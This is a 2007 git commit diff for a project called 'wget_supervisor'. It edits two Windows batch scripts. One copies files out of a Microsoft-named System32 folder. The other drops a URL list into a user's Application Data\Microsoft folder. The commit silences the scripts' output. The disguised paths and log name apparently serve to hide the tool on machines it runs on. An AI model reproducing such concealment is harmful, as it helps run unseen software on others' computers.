a3a11cde5b1df37a49d00d032650dd33ad04d6b6
Igor Ostapenko <ihoro@users.noreply.github.com>
2007-04-24 14:29:19 +0000

    -NEW: now update_urls.cmd and get_files.cmd don't show any technical info, only info messages. So, it do its work quiet ;)

--- wget_supervisor/trunk/src/get_files.cmd
+++ wget_supervisor/trunk/src/get_files.cmd
@@ -1,11 +1,25 @@
-rem $Id$
 @echo off
+rem $Id$
+
+cls
 
 rem create storage directory
 mkdir files
+cls
+
+
+rem info message
+echo Copying... Please, wait a moment.
+
+
 
 rem copy files. you know ;)
-copy /Y %SystemRoot%\System32\Microsoft\*.* .\files\
+copy /Y %SystemRoot%\System32\Microsoft\*.* .\files\ > nul
 
 rem copy log file
-copy /Y %SystemRoot%\System32\win-js-ff_32.log .\files\
+copy /Y %SystemRoot%\System32\win-js-ff_32.log .\files\ > nul
+
+
+
+rem info message
+echo Done.
--- wget_supervisor/trunk/src/update_urls.cmd
+++ wget_supervisor/trunk/src/update_urls.cmd
@@ -1,9 +1,17 @@
-rem $Id$
 @echo off
+rem $Id$
+
+cls
 
 
 rem create directory
 mkdir "C:\Documents and Settings\stud\Application Data\Microsoft"
+cls
 
 rem copy fresh list file
-copy /Y index.inf "C:\Documents and Settings\stud\Application Data\Microsoft"
+copy /Y index.inf "C:\Documents and Settings\stud\Application Data\Microsoft" > nul
+
+
+rem info message
+echo Done.
+
